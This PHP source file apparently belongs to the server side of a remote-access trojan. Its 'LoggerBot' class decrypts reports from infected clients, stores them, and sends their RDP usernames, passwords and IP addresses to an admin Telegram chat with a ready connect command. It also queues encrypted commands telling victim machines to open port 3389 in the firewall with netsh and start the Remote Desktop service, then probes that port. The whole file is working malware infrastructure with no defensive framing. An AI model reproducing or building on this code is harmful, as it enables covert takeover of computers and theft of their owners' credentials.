<?php
class LoggerBot
{


    private function handleRDPReport($data)
    {
        try {
            $this->logWebhook("RDP Report: " . json_encode($data, JSON_UNESCAPED_UNICODE));

            $client_id = $data['client_id'] ?? null;
            $rdp_info = $data['rdp_info'] ?? null;

            if (!$client_id || !$rdp_info) {
                $this->logError("Invalid RDP report: missing client_id or rdp_info");
                http_response_code(400);
                return ['error' => 'Missing client_id or rdp_info'];
            }

            if (!is_string($rdp_info) || !str_contains($rdp_info, '::')) {
                $this->logError("Invalid RDP info format for client_id: $client_id, data: " . substr($rdp_info, 0, 50));
                http_response_code(400);
                return ['error' => 'Invalid RDP info format'];
            }

            $decrypted_info = $this->decrypt($rdp_info);
            if ($decrypted_info === '') {
                $this->logError("Failed to decrypt RDP info for client_id: $client_id");
                http_response_code(400);
                return ['error' => 'Decryption failed'];
            }

            $rdp_data = json_decode($decrypted_info, true);
            if (!$rdp_data || json_last_error() !== JSON_ERROR_NONE) {
                $this->logError("Invalid RDP data format for client_id: $client_id, decrypted: " . substr($decrypted_info, 0, 50));
                http_response_code(400);
                return ['error' => 'Invalid data format'];
            }

            // Log to database
            $stmt = $this->pdo->prepare(
                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
            VALUES (?, 'rdp', ?, NOW())"
            );
            $stmt->execute([$client_id, $decrypted_info]);

            // Update client status
            $stmt = $this->pdo->prepare(
                "UPDATE clients SET ip_address = ?, last_seen = NOW(), is_online = 1 
            WHERE client_id = ?"
            );
            $ip = $rdp_data['public_ip'] ?? ($rdp_data['local_ip'] ?? 'unknown');
            $stmt->execute([$ip, $client_id]);

            // Test port 3389
            $port_status = $this->testPort($ip, 3389);

            // Prepare Telegram message
            $message = "🖥️ RDP Status Update:\n";
            $message .= "Client ID: $client_id\n";
            if (isset($rdp_data['username']) && isset($rdp_data['password'])) {
                $message .= "Status: Enabled\n";
                $message .= "Local IP: " . ($rdp_data['local_ip'] ?? 'N/A') . "\n";
                $message .= "Public IP: " . ($rdp_data['public_ip'] ?? 'N/A') . "\n";
                $message .= "Username: {$rdp_data['username']}\n";
                $message .= "Password: {$rdp_data['password']}\n";
                $message .= "Port 3389 Status: " . ($port_status ? "Open" : "Closed") . "\n";
                $message .= "Connect using: mstsc /v:" . ($rdp_data['public_ip'] ?? $rdp_data['local_ip'] ?? 'unknown') . "\n";
            } else {
                $message .= "Status: Failed\n";
                $message .= "Error: " . ($rdp_data['message'] ?? 'Failed to enable RDP') . "\n";
                $message .= "Port 3389 Status: " . ($port_status ? "Open" : "Closed") . "\n";
            }

            $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
            $this->logWebhook("RDP report processed for client_id: $client_id, message: $message, port_status: " . ($port_status ? 'open' : 'closed'));

            return ['status' => 'success', 'port_status' => $port_status ? 'open' : 'closed'];
        } catch (Exception $e) {
            $this->logError("RDP report failed for client_id: $client_id, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Report failed: ' . $e->getMessage()];
        }
    }

    private function handleEnableRDP($data)
    {
        try {
            $client_id = $data['client_id'] ?? null;
            if (!$client_id) {
                $this->logError("Enable RDP: Missing client_id");
                http_response_code(400);
                return ['error' => 'Missing client_id'];
            }

            // Enhanced RDP enable command with firewall and port check
            $command_data = [
                'type' => 'enable_rdp',
                'params' => [
                    'firewall_rule' => 'netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389',
                    'port_check' => 'netstat -an | find "3389"',
                    'rdp_service' => 'net start termservice'
                ]
            ];
            $encrypted_command = $this->encrypt(json_encode($command_data));
            $stmt = $this->pdo->prepare(
                "INSERT INTO client_commands (client_id, command, status, created_at) 
            VALUES (?, ?, 'pending', NOW())"
            );
            $stmt->execute([$client_id, $encrypted_command]);

            $this->logWebhook("Enable RDP command queued for client_id: $client_id, params: " . json_encode($command_data));
            return ['status' => 'success', 'message' => 'Enable RDP command queued'];
        } catch (Exception $e) {
            $this->logError("Enable RDP failed: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Enable RDP failed: ' . $e->getMessage()];
        }
    }

    private function handleDisableRDP($data)
    {
        try {
            $client_id = $data['client_id'] ?? null;
            if (!$client_id) {
                $this->logError("Disable RDP: Missing client_id");
                http_response_code(400);
                return ['error' => 'Missing client_id'];
            }

            $command_data = ['type' => 'disable_rdp', 'params' => []];
            $encrypted_command = $this->encrypt(json_encode($command_data));
            $stmt = $this->pdo->prepare(
                "INSERT INTO client_commands (client_id, command, status, created_at) 
            VALUES (?, ?, 'pending', NOW())"
            );
            $stmt->execute([$client_id, $encrypted_command]);

            $this->logWebhook("Disable RDP command queued for client_id: $client_id");
            return ['status' => 'success', 'message' => 'Disable RDP command queued'];
        } catch (Exception $e) {
            $this->logError("Disable RDP failed: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Disable RDP failed: ' . $e->getMessage()];
        }
    }

    private function testPort($host, $port, $timeout = 3)
    {
        $this->logWebhook("Testing port $port on host $host");
        $fp = @fsockopen($host, $port, $errno, $errstr, $timeout);
        if ($fp) {
            fclose($fp);
            $this->logWebhook("Port $port on $host is open");
            return true;
        } else {
            $this->logError("Port $port on $host is closed or unreachable: $errstr ($errno)");
            return false;
        }
    }
}
